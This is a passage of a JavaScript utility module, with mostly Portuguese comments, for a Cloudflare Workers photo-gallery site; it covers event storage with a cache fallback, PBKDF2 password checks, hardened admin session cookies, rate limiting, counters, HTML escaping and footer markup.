import { dataSecurityHeaders, sanitizeFilename } from './security.js';

/**
 * Um projeto como ele vive no KV. Índice aberto de propósito: a forma real é
 * validada na LEITURA (`parseEvents`), não aqui — o valor pode vir de um
 * restore de backup ou edição manual, e validar na porta seria 500 na galeria
 * inteira.
 * @typedef {Record<string, any>} Evento
 */
/**
 * Bindings do wrangler.toml mais os segredos de `wrangler secret put`.
 * Segredos são opcionais porque a ausência é um estado real e tratado —
 * `auditSite()` acusa cada falta e o site continua entregando foto (ver
 * SIGNING_SECRET no wrangler.toml).
 * @typedef {{
 *   FOTOS: KVNamespace,
 *   COUNTER: DurableObjectNamespace<import('./counters.js').Counter>,
 *   RATELIMIT: DurableObjectNamespace<import('./counters.js').RateLimiter>,
 *   CONSENT_DB?: D1Database,
 *   PERF?: { writeDataPoint: (d: any) => void },
 *   ADMIN_PASSWORD?: string,
 *   TURNSTILE_SECRET_KEY?: string,
 *   RESEND_API_KEY?: string,
 *   ADMIN_EMAIL?: string,
 *   SIGNING_SECRET?: string,
 *   CF_ANALYTICS_TOKEN?: string,
 *   KUMA_PUSH_URL?: string,
 * }} Env
 */

/**
 * Um pedido de remoção / mensagem de suporte, como lido do KV. Índice aberto
 * pelo mesmo motivo de `Evento`: pode vir de um restore.
 * @typedef {Record<string, any>} Pedido
 */


/** @type {any[]|null} */
let _cache = null;
let _cacheAt = 0;
const CACHE_TTL = 30_000;
// Abort outbound transactional-email calls if Resend hangs, so a slow upstream
// never holds the request past this budget.
const EMAIL_TIMEOUT_MS = 10_000;
// Minimum gap between unhandled-exception alert emails — a single global
// cooldown (not per-error-type) so an incident that throws repeatedly can't
// flood the inbox; still frequent enough that a real outage is noticed fast.
const ERROR_ALERT_COOLDOWN_SECS = 900;

// Terms of Service version (the "Atualizada em" date, YYYY-MM-DD). Bump whenever the
// Terms text changes — every image-use consent record pins the version the visitor
// accepted, so old acceptances stay tied to the exact text they agreed to.
export const TERMS_VERSION = '2026-06-18';

// Exact wording of the consent the visitor ticks before Drive access. Stored verbatim
// with each consent record (the client echoes it back) for non-repudiation.
export const CONSENT_LABEL = 'Li e aceito os Termos de Uso e autorizo o uso da minha imagem conforme descrito neles.';

// Access categories for a project. Drives which self-declaration the gateway requires
// before unlocking the Drive link, and is recorded with each consent. 'public' is the
// default for legacy events with no accessType set.
export const ACCESS_TYPES = ['public', 'private', 'family'];

// Per-category self-declarations the visitor must additionally tick (on top of the Terms)
// before the Drive link unlocks, for 'family' and 'private' projects. Stored verbatim with
// each consent record for non-repudiation — the canonical source, like CONSENT_LABEL.
// 'public' has no extra declaration (Terms acceptance only).
export const ACCESS_DECLARATIONS = {
  family:  'Declaro ser membro da família e reconheço que estas imagens são de uso estritamente particular e doméstico.',
  private: 'Declaro que sou participante deste evento ou possuo autorização para acessar estas imagens. Estou ciente de que o material destina-se ao meu uso pessoal e não deve ser comercializado.',
};

// Cópia de sobrevivência da lista de eventos, via Cache API. KV é a única
// dependência no caminho crítico (sem lista de eventos não há slug, evento ou
// link do Drive) — uma queda de LEITURA do KV derrubava galeria, página do
// projeto e portão do Drive de uma vez, com 500.
//
// Cache API: grátis, sem cota de escrita, vive no colo (não no isolate) e por
// isso sobrevive à troca de isolate — o buraco que o cache de módulo não
// cobre. Não é fonte de verdade, pode ser despejada a qualquer momento, mas
// como último recurso antes do 500 é do tamanho certo do problema.
const EVENTS_CACHE_KEY = 'https://fotos.invalid/__events'; // Cache API exige chave http(s)
// 7 dias: não é "por quanto tempo o dado vale", é "por quanto tempo ainda
// prefiro dado velho a um 500" — mais que qualquer queda de KV plausível.
const EVENTS_CACHE_TTL_S = 7 * 24 * 3600;
/** @type {string|null} */
let _mirroredRaw = null;

function cacheStore() {
  // Ausente no vitest e fora do runtime Workers — função inteira é best-effort.
  return (typeof caches !== 'undefined' && caches && caches.default) || null;
}

// Só grava quando o valor MUDOU: reescrever a cada leitura gastaria CPU do
// isolate à toa no caminho de resposta.
/**
 * @param {string} raw
 */
async function mirrorEvents(raw) {
  const store = cacheStore();
  if (!store || typeof raw !== 'string' || raw === _mirroredRaw) return;
  try {
    await store.put(EVENTS_CACHE_KEY, new Response(raw, {
      headers: { 'Content-Type': 'application/json', 'Cache-Control': `max-age=${EVENTS_CACHE_TTL_S}` },
    }));
    _mirroredRaw = raw;
  } catch (e) {
    console.error('events mirror write failed', e);
  }
}

async function readMirroredEvents() {
  const store = cacheStore();
  if (!store) return null;
  try {
    const hit = await store.match(EVENTS_CACHE_KEY);
    return hit ? await hit.text() : null;
  } catch (e) {
    console.error('events mirror read failed', e);
    return null;
  }
}

// Entra no registro de degradações central. healthz decide `kv` pela própria
// leitura (fresh, nunca cai para cópia) e não por este estado de módulo —
// compartilhado entre requisições concorrentes, o que já causou um
// falso-negativo ali (healthz via `kv:false` por uma queda de outra requisição).
/**
 * @param {string} source
 */
function noteEventsFallback(source) {
  noteDegraded(
    'lista de projetos vindo de cópia',
    `KV de leitura fora; servindo da ${source}. Edições feitas agora podem não chegar ao visitante até o KV voltar`
  );
}

// Mesma validação de forma para o valor do KV e o da cópia — duas versões
// disso divergiriam, e a cópia é o caminho que ninguém exercita no dia a dia.
/**
 * @param {string|null|undefined} data
 * @returns {Evento[]}
 */
function parseEvents(data) {
  if (!data) return [];
  try {
    const parsed = JSON.parse(data);
    if (!Array.isArray(parsed)) return [];
    return parsed.filter(e => e && typeof e === 'object' && !Array.isArray(e));
  } catch { return []; }
}

// fresh=true bypasses the isolate-local cache — required on admin reads and
// any read-modify-write, where 30 s of staleness could clobber another
// isolate's recent save.
/**
 * @param {Env} env
 * @param {boolean} [fresh]
 * @returns {Promise<Evento[]>}
 */
export async function getEvents(env, fresh = false) {
  const now = Date.now();
  if (!fresh && _cache && now - _cacheAt < CACHE_TTL) return _cache;

  let data;
  try {
    data = await env.FOTOS.get('events');
  } catch (e) {
    // `fresh` NUNCA cai para a cópia: quem pede fresh é admin ou
    // read-modify-write, onde dado velho não degrada com elegância — o
    // `saveEvents` seguinte gravaria a lista antiga por cima, apagando tudo
    // que mudou desde a cópia. Falhar aqui custa um erro ao dono; a
    // alternativa custa os projetos.
    if (fresh) throw e;

    // Caminho de VISITANTE, onde lista velha ainda entrega a foto certa.
    // Do mais novo ao mais velho:
    if (_cache) {
      // Cache do isolate, mesmo vencido — velho por 30s continua certo.
      noteEventsFallback('cache do isolate');
      console.error('KV read failed; serving events from the isolate cache', e);
      return _cache;
    }
    // Cópia na Cache API: salva um isolate FRIO, o caso comum numa queda.
    const mirrored = await readMirroredEvents();
    if (mirrored !== null) {
      noteEventsFallback('cópia na Cache API');
      console.error('KV read failed; serving events from the cache mirror', e);
      _cache = parseEvents(mirrored);
      _cacheAt = now;
      return _cache;
    }
    // Sem cópia, propaga: devolver [] viraria "site sem projeto nenhum" — 404
    // em tudo, `ok:true` no healthz. Mentir sobre não ter dado é pior.
    throw e;
  }

  // Single choke point for shape validation: every caller reads through here,
  // so a corrupted `events` value (bad restore, truncated write) can't throw
  // on `e.visible`/`e.slug` and 500 the whole public site.
  _cache = parseEvents(data);
  _cacheAt = now;
  // Espelha o texto cru, não o objeto filtrado: a validação de forma precisa
  // acontecer de novo na leitura da cópia também.
  if (typeof data === 'string') await mirrorEvents(data);
  return _cache;
}

/**
 * @param {Env} env
 * @param {Evento[]} events
 */
export async function saveEvents(env, events) {
  _cache = events;
  _cacheAt = Date.now();
  const raw = JSON.stringify(events);
  await env.FOTOS.put('events', raw);
  // Depois do KV aceitar, e não antes: espelhar um valor que não chegou a ser
  // gravado faria a cópia contradizer a fonte.
  await mirrorEvents(raw);
}

// Categories are user-managed (created/deleted from the dashboard) and stored
// as a flat list of display names under the KV key `categories`. Until the
// owner changes anything, these defaults apply.
export const DEFAULT_CATEGORIES = ['Formatura', 'Casamento', 'Ensaio', 'Evento', 'Outro'];
export const MAX_CATEGORIES = 30;
export const MAX_CATEGORY_LEN = 40;

// Falha de LEITURA propaga, de propósito: todo chamador é rota de admin que
// pode GRAVAR a lista de volta (criar categoria, restore) — cair para os
// defaults apagaria para sempre as categorias do dono. Valor corrompido, sim,
// cai para os defaults: nada ali para preservar, e a próxima gravação conserta.
/**
 * @param {Env} env
 */
export async function getCategories(env) {
  const data = await env.FOTOS.get('categories');
  if (!data) return [...DEFAULT_CATEGORIES];
  try {
    const arr = JSON.parse(data);
    return Array.isArray(arr) ? arr.filter(c => typeof c === 'string') : [...DEFAULT_CATEGORIES];
  } catch {
    return [...DEFAULT_CATEGORIES];
  }
}

/**
 * @param {Env} env
 * @param {string[]} cats
 */
export async function saveCategories(env, cats) {
  await env.FOTOS.put('categories', JSON.stringify(cats));
}


/**
 * @param {string} hex
 */
function hexToBytes(hex) {
  const arr = new Uint8Array(hex.length / 2);
  for (let i = 0; i < arr.length; i++) arr[i] = parseInt(hex.slice(i * 2, i * 2 + 2), 16);
  return arr;
}

/**
 * @param {Uint8Array} u8
 */
function bytesToHex(u8) {
  return Array.from(u8).map(b => b.toString(16).padStart(2, '0')).join('');
}

/**
 * @param {string} a
 * @param {string} b
 */
export function timingSafeEqual(a, b) {
  if (typeof a !== 'string' || typeof b !== 'string') return false;
  if (a.length !== b.length) return false;
  let diff = 0;
  for (let i = 0; i < a.length; i++) diff |= a.charCodeAt(i) ^ b.charCodeAt(i);
  return diff === 0;
}

// 100k measures ~50 ms — within the 200 ms CI healthz budget (deploy.yml).
// Stored hashes embed their own iteration count, so raising this never
// breaks existing credentials.
/**
 * @param {string} password
 * @param {string} [saltHex]
 * @param {number} [iterations]
 */
export async function hashPassword(password, saltHex, iterations = 100_000) {
  const enc = new TextEncoder();
  const salt = saltHex
    ? hexToBytes(saltHex)
    : crypto.getRandomValues(new Uint8Array(16));
  const key = await crypto.subtle.importKey('raw', enc.encode(password), 'PBKDF2', false, ['deriveBits']);
  const bits = await crypto.subtle.deriveBits(
    { name: 'PBKDF2', hash: 'SHA-256', salt, iterations },
    key, 256
  );
  return `pbkdf2:${iterations}:${bytesToHex(salt)}:${bytesToHex(new Uint8Array(bits))}`;
}

/**
 * @param {string} password
 * @param {string|null|undefined} stored
 */
export async function verifyPassword(password, stored) {
  if (!stored) return false;
  if (!stored.startsWith('pbkdf2:')) {
    // Legacy SHA-256 path — only active during the first login after migration
    const enc = new TextEncoder();
    const buf = await crypto.subtle.digest('SHA-256', enc.encode(password));
    return timingSafeEqual(bytesToHex(new Uint8Array(buf)), stored);
  }
  const [, rawIterations, saltHex] = stored.split(':');
  const iterations = parseInt(rawIterations, 10);
  // Hash ilegível não pode virar EXCEÇÃO: `deriveBits` recusa uma contagem de
  // iterações não inteira/positiva, e um `admin_password` corrompido lançaria
  // de dentro do login — 500 em vez de "senha incorreta", escondendo a causa e
  // pulando o redirect que conta a tentativa. Teto do outro lado: a contagem
  // vem do próprio registro, e um valor absurdo estouraria CPU do Worker a
  // cada tentativa — DoS sobre a única porta de entrada do painel.
  if (!Number.isInteger(iterations) || iterations < 1 || iterations > 1_000_000) return false;
  if (typeof saltHex !== 'string' || !/^[0-9a-f]+$/.test(saltHex) || saltHex.length % 2 !== 0) return false;
  const candidate = await hashPassword(password, saltHex, iterations);
  return timingSafeEqual(candidate, stored);
}

export function generateToken() {
  const bytes = new Uint8Array(32);
  crypto.getRandomValues(bytes);
  return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
}

// ---------------------------------------------------------------------------
// Sessão do painel
// ---------------------------------------------------------------------------
// Prefixo `__Host-`: o browser só aceita gravá-lo com Secure, Path=/ e SEM
// Domain — nenhum outro host de lucafchala.com (subdomínio comprometido,
// CNAME de terceiro) consegue definir ou sobrescrever este cookie. Cobre a
// fixação de sessão por vizinho de domínio que SameSite=Strict sozinho não pega.
//
// Nome antigo (`session`) continua sendo LIDO para não derrubar quem já
// estava logado antes do deploy. Só gravamos o novo.
export const SESSION_COOKIE = '__Host-session';
export const SESSION_TTL_SECS = 86400;     // teto absoluto: 24 h, como antes
export const SESSION_IDLE_SECS = 7200;     // 2 h sem uso encerram a sessão
const SESSION_REFRESH_SECS = 600;          // só reescreve o "lastSeen" a cada 10 min

/**
 * @param {string} token
 * @param {{ clear?: boolean }} [opts]
 */
export function sessionCookie(token, { clear = false } = {}) {
  const base = `${SESSION_COOKIE}=${clear ? '' : token}; Path=/; HttpOnly; Secure; SameSite=Strict`;
  return clear ? `${base}; Max-Age=0` : `${base}; Max-Age=${SESSION_TTL_SECS}`;
}

// ÚNICO lugar que decide QUAL token o pedido está apresentando. Existe como
// função — e não como um regex repetido em cada chamador — porque a precedência
// entre os dois nomes de cookie É o controle, e ela já foi perdida uma vez:
// `verifySession` foi corrigida para preferir `__Host-session`, mas o logout e
// a troca de senha continuaram com o padrão único `(?:__Host-)?session=`, que o
// `match()` resolve para a PRIMEIRA ocorrência. Em
// `session=antigo; __Host-session=novo` os três liam tokens diferentes:
//
//   • o logout apagava do KV o registro ERRADO — o cookie saía do browser mas a
//     sessão de verdade seguia aceita até o TTL de 24 h, justamente a revogação
//     que o logout existe para fazer (ver SECURITY.md);
//   • a troca de senha preservava o token apontado pelo cookie legado e apagava
//     o do próprio admin.
//
// E o cookie legado é FORJÁVEL: um vizinho de lucafchala.com grava `session=`,
// mas não `__Host-session` — essa assimetria é a razão de o prefixo existir.
// Com um leitor só, uma correção vale para todos os chamadores de uma vez.
/**
 * @param {string} cookies conteúdo cru do cabeçalho `Cookie`
 * @returns {string|null} o token de 64 hexadecimais, ou null se não houver
 */
export function sessionTokenFromCookie(cookies) {
  if (typeof cookies !== 'string' || !cookies) return null;
  const match = cookies.match(/(?:^|;\s*)__Host-session=([a-f0-9]{64})/)
             || cookies.match(/(?:^|;\s*)session=([a-f0-9]{64})/);
  return match ? match[1] : null;
}

/**
 * @param {Request} request
 * @returns {string|null}
 */
export function sessionTokenFromRequest(request) {
  return sessionTokenFromCookie(request.headers.get('Cookie') || '');
}

// Impressão grosseira do cliente. Só User-Agent: IP fica de fora porque
// celular troca de IP o tempo todo (4G/Wi-Fi) e amarrar a sessão a ele
// deslogaria o admin no meio de uma edição.
/**
 * @param {Request} request
 */
export function clientFingerprint(request) {
  const ua = request.headers.get('User-Agent') || '';
  let h = 2166136261; // FNV-1a de 32 bits: identificador curto, não é segredo
  for (let i = 0; i < ua.length; i++) {
    h ^= ua.charCodeAt(i);
    h = Math.imul(h, 16777619);
  }
  return (h >>> 0).toString(36);
}

/**
 * @param {Request} request
 */
export function sessionRecord(request) {
  const now = Date.now();
  return JSON.stringify({ v: 1, createdAt: now, lastSeen: now, fp: clientFingerprint(request) });
}

// Encerra a sessão por TTL, inatividade OU fingerprint trocado — antes era só
// uma comparação com a string 'valid', sem inatividade nem vínculo com o
// cliente que abriu a sessão.
/**
 * @param {Env} env
 * @param {Request} request
 */
export async function verifySession(env, request) {
  // Precedência do `__Host-` em `sessionTokenFromCookie()`, que é o leitor
  // único — ver o comentário lá para o que a divergência custava.
  const token = sessionTokenFromRequest(request);
  if (!token) return false;

  const key = `admin_session:${token}`;
  const raw = await env.FOTOS.get(key);
  if (!raw) return false;

  // Sessão criada antes deste deploy: sem metadado. Aceita até expirar pelo
  // TTL do KV, senão o deploy deslogaria quem estava no meio de um trabalho.
  if (raw === 'valid') return true;

  let rec;
  try { rec = JSON.parse(raw); } catch { return false; }
  if (!rec || typeof rec !== 'object') return false;

  const now = Date.now();
  // createdAt ausente/corrompido não pode virar "sessão eterna": sem início
  // confiável, a resposta segura para uma credencial ilegível é recusá-la.
  const createdAt = typeof rec.createdAt === 'number' && Number.isFinite(rec.createdAt) ? rec.createdAt : null;
  if (createdAt === null) {
    await env.FOTOS.delete(key).catch(() => {});
    return false;
  }
  if (rec.fp && rec.fp !== clientFingerprint(request)) {
    await env.FOTOS.delete(key).catch(() => {});
    return false;
  }
  // Teto absoluto checado no código, não só pelo TTL do KV: um registro
  // reescrito com prazo errado (createdAt corrompido gerava expirationTtl NaN,
  // que a escrita recusa em silêncio) sobreviveria além das 24h sem aviso.
  if (now - createdAt > SESSION_TTL_SECS * 1000) {
    await env.FOTOS.delete(key).catch(() => {});
    return false;
  }
  if (typeof rec.lastSeen === 'number' && now - rec.lastSeen > SESSION_IDLE_SECS * 1000) {
    await env.FOTOS.delete(key).catch(() => {});
    return false;
  }

  // Renovação travada a 1x/10min por sessão, não por requisição: o painel faz
  // várias chamadas por tela e a cota de escrita do KV é 1000/dia.
  if (typeof rec.lastSeen !== 'number' || now - rec.lastSeen > SESSION_REFRESH_SECS * 1000) {
    // TTL renovado acompanha o teto absoluto — senão viraria sessão perpétua.
    const ttl = Math.max(60, Math.round((createdAt + SESSION_TTL_SECS * 1000 - now) / 1000));
    await env.FOTOS.put(key, JSON.stringify({ ...rec, lastSeen: now }), { expirationTtl: ttl })
      .catch(e => noteKvFailure('escrita', e, 'session refresh'));
  }
  return true;
}

// KV write quota is 1000/day account-wide; past it, writes throw. Unhandled,
// that would bubble from `checkRateLimit` into fetch()'s catch — 500 on the
// Drive gate for everyone right at peak traffic. So counter/rate-limit writes
// are isolated and fail open, logged via noteDegraded/healthz instead
// (mitigation, not a guarantee — SECURITY.md).
// ---------------------------------------------------------------------------
// Registro de degradações: um lugar só, para nada falhar calado
// ---------------------------------------------------------------------------
// O site continua entregando foto quando algo quebra — por isso o aviso é
// obrigatório: sem ele, "o site está no ar" vira prova de que está tudo bem.
// Era três registradores separados; agora é um: quem degradar chama
// `noteDegraded`, e /api/healthz relata tudo dentro da janela.
//
// Estado de módulo, sem persistência (persistir exigiria a escrita que pode
// estar sendo recusada) — vale por isolate, aceitável porque a condição é da
// conta inteira e qualquer isolate a encontra em segundos.
const DEGRADED_TTL_MS = 30 * 60_000;
const _degraded = new Map();

// `label` é a chave de dedup e o texto exibido no painel — escreva como a
// frase que você quer ler às 2h da manhã: o que quebrou, o que parou.
// Tudo passa por `umaLinha()` antes de virar log/texto de painel: `detail`
// carrega erro de sistema externo e identificadores que não são nossos, e uma
// quebra de linha ali forjaria uma entrada de log inteira.
/**
 * @param {unknown} v
 */
function umaLinha(v) {
  return String(v)
    // Controles C0/C1 e separadores de linha Unicode por código-ponto, não por
    // caractere colado — um intervalo literal aqui fica ilegível no editor.
    // eslint-disable-next-line no-control-regex
    .replace(/[\u0000-\u001f\u007f-\u009f\u2028\u2029]+/g, ' ')
    .trim()
    .slice(0, 160);
}

// Mensagem legível a partir de algo LANÇADO, não necessariamente um Error.
// `catch (e)` entrega `unknown` — string, objeto de lib, ou `undefined` de um
// `throw` sem valor. Ler `.message` direto quebrava justo no caso raro que se
// está tentando registrar. O padrão antigo (`e && e.message ? e.message : e`)
// também mentia: objeto sem `message` virava "[object Object]" no painel.
/**
 * @param {unknown} err
 * @returns {string}
 */
export function errMessage(err) {
  if (err instanceof Error && err.message) return err.message;
  if (typeof err === 'string' && err) return err;
  if (err && typeof err === 'object') {
    const m = /** @type {{ message?: unknown }} */ (err).message;
    if (typeof m === 'string' && m) return m;
  }
  return String(err);
}

/**
 * @param {string} label
 * @param {string} [detail]
 * @param {unknown} [err] o que foi LANÇADO — pode não ser Error.
 */
export function noteDegraded(label, detail = '', err = null) {
  const rotulo = umaLinha(label);
  const texto = umaLinha(detail);
  _degraded.set(rotulo, { at: Date.now(), detail: texto });
  console.error(`degradado: ${rotulo}${texto ? ` — ${texto}` : ''}`, err || '');
}

// Mais recente primeiro: numa cascata, a última coisa a quebrar costuma ser a
// consequência, e a primeira, a causa — mas quem olha o painel quer ver o que
// está acontecendo agora.
export function degradedHealth(now = Date.now()) {
  const out = [];
  for (const [label, { at, detail }] of _degraded) {
    if (now - at > DEGRADED_TTL_MS) continue;
    out.push({ label, detail, agoSecs: Math.round((now - at) / 1000) });
  }
  return out.sort((a, b) => a.agoSecs - b.agoSecs);
}

export function resetDegraded() { _degraded.clear(); }

// Atalho para o caso mais comum: uma operação de KV recusada. `op` não é
// cosmético — uma falha de leitura relatada como escrita mandaria quem
// investiga procurar cota de escrita esgotada, sem nada a ver.
/**
 * @param {'escrita'|'leitura'} op
 * @param {unknown} err
 * @param {string} [context]
 */
export function noteKvFailure(op, err, context = '') {
  const motivo = errMessage(err).slice(0, 120);
  noteDegraded(
    `KV: ${op} recusada`,
    `${context ? `${context} — ` : ''}${motivo}${op === 'escrita' ? ' (se for cota diária, volta na virada UTC)' : ''}`,
    err
  );
}

// ---------------------------------------------------------------------------
// Contadores: um Durable Object por chave, incremento atômico
// ---------------------------------------------------------------------------
// Substituiu a agregação em memória (mapa de pendentes, piso de 1s, trava de
// flush) que existia porque KV não tem incremento atômico e recusa >1
// escrita/s por chave. DO resolve as duas de graça — porquê da troca em
// src/counters.js. Contagem exata mesmo sob rajada, e nada se perde se o
// isolate morrer com incremento pendente — não há pendente.

// Nome fixo: todos os contadores no MESMO objeto — painel lê tudo de uma vez,
// e chamada de DO é subrequisição (50/invocação no plano gratuito). Ver
// src/counters.js.
const COUNTER_OBJ = 'contadores';

/**
 * Superfície RPC usada do Counter, declarada à mão: a inferência sobre
 * `DurableObjectNamespace<Counter>` estoura a profundidade do tsc. Um `any`
 * aqui esconderia justamente os nomes que quebrariam num rename.
 * @typedef {{
 *   increment: (key: string, by?: number) => Promise<number>,
 *   value: (key: string) => Promise<number>,
 *   snapshot: (keys: string[]) => Promise<{ counts: Record<string, number>, missing: string[] }>,
 *   seed: (map: Record<string, unknown>) => Promise<void>,
 *   remove: (keys: string[]) => Promise<void>,
 * }} CounterRPC
 */

/**
 * @param {Env} env
 * @returns {CounterRPC}
 */
function counterStub(env) {
  return /** @type {any} */ (env.COUNTER.get(env.COUNTER.idFromName(COUNTER_OBJ)));
}

// Nunca lança: chamada do caminho de resposta do visitante, onde uma exceção
// viraria 500 numa página que só queria contar uma visita. Devolve a promessa
// para quem não tem `ctx` conseguir aguardá-la.
/**
 * @param {Env} env
 * @param {{ waitUntil?: (p: Promise<any>) => void }|null} ctx
 * @param {string} key
 * @param {number} [by]
 */
export function bumpCounter(env, ctx, key, by = 1) {
  const work = (async () => {
    try {
      await counterStub(env).increment(key, by);
    } catch (e) {
      noteDegraded('contador não gravado', `${key} (+${by}) — ${umaLinha(errMessage(e)).slice(0, 120)}`, e);
    }
  })();
  if (ctx && typeof ctx.waitUntil === 'function') ctx.waitUntil(work);
  return work;
}

/**
 * @param {Env} env
 * @param {string} key
 */
export async function readCounter(env, key) {
  try {
    return toCount(await counterStub(env).value(key));
  } catch (e) {
    noteDegraded('contador não lido', `${key} — ${umaLinha(errMessage(e)).slice(0, 120)}`, e);
    return 0;
  }
}

// Leitura em LOTE para o painel: uma subrequisição para todos os projetos, não
// duas por projeto — resolve o "Erro ao carregar métricas" a partir de ~24
// projetos. O assentamento (seed) acontece aqui e não dentro do objeto: ler o
// KV lá dentro gastaria a cota de subrequisição DELE, mesmo erro um nível abaixo.
/**
 * @param {Env} env
 * @param {string[]} keys
 * @returns {Promise<Record<string, number>>}
 */
export async function readCounters(env, keys) {
  if (!keys.length) return {};
  try {
    const stub = counterStub(env);
    const { counts, missing } = await stub.snapshot(keys);

    if (missing.length) {
      /** @type {Record<string, unknown>} */
      const doKv = {};
      await Promise.all(missing.map(/** @param {string} k */ async k => {
        try { doKv[k] = await env.FOTOS.get(k); } catch { doKv[k] = null; }
      }));
      await stub.seed(doKv);
      for (const k of missing) counts[k] = toCount(doKv[k]);
    }
    return counts;
  } catch (e) {
    noteDegraded('contadores não lidos', `lote de ${keys.length} — ${umaLinha(errMessage(e)).slice(0, 120)}`, e);
    return {};
  }
}

/**
 * @param {Env} env
 * @param {string[]} keys
 */
export async function deleteCounters(env, keys) {
  try {
    await counterStub(env).remove(keys);
  } catch (e) {
    noteDegraded('contadores não apagados', `${keys.join(', ')} — ${umaLinha(errMessage(e)).slice(0, 120)}`, e);
  }
}

// Contador em KV é string; parseInt puro numa corrompida devolve NaN, e
// `String(NaN)` grava "NaN" de volta — envenenando o contador para sempre.
// Estrito de propósito: parseInt sozinho aceita prefixo ("12abc"->12) e
// negativo ("-5"). Contador é inteiro não-negativo ou é lixo — lixo recomeça
// do 0 em vez de carregar sujeira adiante.
//
// Mora aqui, não em index.js, porque utils.js não pode importar de index.js
// (círculo); index.js reexporta.
/**
 * @param {unknown} v
 * @returns {number}
 */
export function toCount(v) {
  if (typeof v === 'number') return Number.isInteger(v) && v >= 0 ? v : 0;
  if (typeof v !== 'string') return 0;
  const s = v.trim();
  if (!/^\d+$/.test(s)) return 0;
  const n = parseInt(s, 10);
  return Number.isSafeInteger(n) ? n : 0;
}

// Rate limit de janela fixa em Durable Object, um objeto por (chave, IP).
// Antes era leitura+escrita separadas em KV — corrida onde duas requisições
// liam a mesma contagem e ambas passavam. Agora checagem+incremento acontecem
// na mesma chamada, serializada pelo runtime.
//
// Falha ABERTO: contabilidade não pode derrubar a entrega de fotos nem
// trancar o dono fora do painel. Falha entra no registro de degradações
// (SECURITY.md).
/**
 * @param {Env} env
 * @param {string} ip
 * @param {string} key
 * @param {number} limit
 * @param {number} windowSecs
 */
export async function checkRateLimit(env, ip, key, limit, windowSecs) {
  try {
    const id = env.RATELIMIT.idFromName(`${key}:${ip}`);
    return await env.RATELIMIT.get(id).check(limit, windowSecs);
  } catch (e) {
    noteDegraded('rate limit indisponível', `${key} — ${umaLinha(errMessage(e)).slice(0, 120)}`, e);
    return true;
  }
}

/**
 * @param {unknown} str
 */
export function escape(str) {
  if (str === null || str === undefined) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// Rodapé compartilhado por toda página pública, para não divergir conforme
// links são adicionados. Ano calculado em runtime (páginas renderizam por
// requisição, sem passo de build). `extra` deixa uma página específica somar
// um link (ex.: "Ver tour novamente" em event.js) sem sobrecarregar a linha
// padrão. "Privacidade"/"Termos" viraram um único link "Legal" -> /legal, de
// onde os dois continuam a um clique — o rodapé tinha 6 links competindo por
// atenção.
export function footerLegalLinksHTML(extra = '') {
  const year = new Date().getFullYear();
  return `
    <div class="footer-actions-legal">
      <a href="/sobre" class="legal-link">Sobre</a>
      <a href="/equipamentos" class="legal-link">Equipamento</a>
      <a href="/suporte" class="legal-link">Suporte</a>
      <a href="/legal" class="legal-link">Legal</a>
      <a href="https://github.com/lucafchala/fotos" target="_blank" rel="noopener" class="legal-link">Código-fonte</a>
      ${extra}
    </div>
    <p class="footer-copyright">© ${year} Luca F. Chala. Todos os direitos reservados.</p>`;
}

// Instagram-branded credit button, reused twice on the event page (main
// credits section + drive-modal guide box). idSuffix keeps each instance's
// SVG gradient id unique since both can render on the same document.
/**
 * @param {string} idSuffix
 * @param {string} [label]
 */
export function igCreditButtonHTML(idSuffix, label = 'Marque-me') {
  return `
    <a href="https://instagram.com/lucafchala" target="_blank" rel="noopener" class="ig-credit-btn">
      <span class="ig-credit-icon">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18">
          <defs>
            <linearGradient id="igGrad${idSuffix}" x1="0%" y1="100%" x2="100%" y2="0%">
              <stop offset="0%" stop-color="#f09433"/><stop offset="25%" stop-color="#e6683c"/>
              <stop offset="50%" stop-color="#dc2743"/><stop offset="75%" stop-color="#cc2366"/>
              <stop offset="100%" stop-color="#bc1888"/>
            </linearGradient>
          </defs>
          <path fill="url(#igGrad${idSuffix})" d="M12 0C8.74 0 8.333.015 7.053.072 5.775.132 4.905.333 4.14.63c-.789.306-1.459.717-2.126 1.384S.935 3.35.63 4.14C.333 4.905.131 5.775.072 7.053.012 8.333 0 8.74 0 12s.015 3.667.072 4.947c.06 1.277.261 2.148.558 2.913.306.788.717 1.459 1.384 2.126.667.666 1.336 1.079 2.126 1.384.766.296 1.636.499 2.913.558C8.333 23.988 8.74 24 12 24s3.667-.015 4.947-.072c1.277-.06 2.148-.262 2.913-.558.788-.306 1.459-.718 2.126-1.384.666-.667 1.079-1.335 1.384-2.126.296-.765.499-1.636.558-2.913.06-1.28.072-1.687.072-4.947s-.015-3.667-.072-4.947c-.06-1.277-.262-2.149-.558-2.913-.306-.789-.718-1.459-1.384-2.126C21.319 1.347 20.651.935 19.86.63c-.765-.297-1.636-.499-2.913-.558C15.667.012 15.26 0 12 0Zm0 2.16c3.203 0 3.585.016 4.85.071 1.17.055 1.805.249 2.227.415.562.217.96.477 1.382.896.419.42.679.819.896 1.381.164.422.36 1.057.413 2.227.057 1.266.07 1.646.07 4.85s-.015 3.585-.074 4.85c-.061 1.17-.256 1.805-.421 2.227-.224.562-.479.96-.897 1.382-.419.419-.824.679-1.38.896-.42.164-1.065.36-2.235.413-1.274.057-1.649.07-4.859.07-3.211 0-3.586-.015-4.859-.074-1.171-.061-1.816-.256-2.236-.421-.569-.224-.96-.479-1.379-.897-.421-.419-.69-.824-.9-1.38-.165-.42-.359-1.065-.42-2.235-.045-1.26-.061-1.649-.061-4.844 0-3.196.016-3.586.061-4.861.061-1.17.255-1.814.42-2.234.21-.57.479-.96.9-1.381.419-.419.81-.689 1.379-.898.42-.166 1.051-.361 2.221-.421 1.275-.045 1.65-.06 4.859-.06L12 2.16Zm0 3.678c-3.405 0-6.162 2.76-6.162 6.162 0 3.405 2.76 6.162 6.162 6.162 3.405 0 6.162-2.76 6.162-6.162 0-3.405-2.76-6.162-6.162-6.162ZM12 16c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4Zm7.846-10.405c0 .795-.646 1.44-1.44 1.44-.795 0-1.44-.646-1.44-1.44 0-.794.646-1.439 1.44-1.439.793-.001 1.44.645 1.44 1.439Z"/>
        </svg>
      </span>
      <span class="ig-credit-text">${label}: <strong>@lucafchala</strong></span>
    </a>`;
}

// Dismissible "new interface" notice shown on the gallery and every project
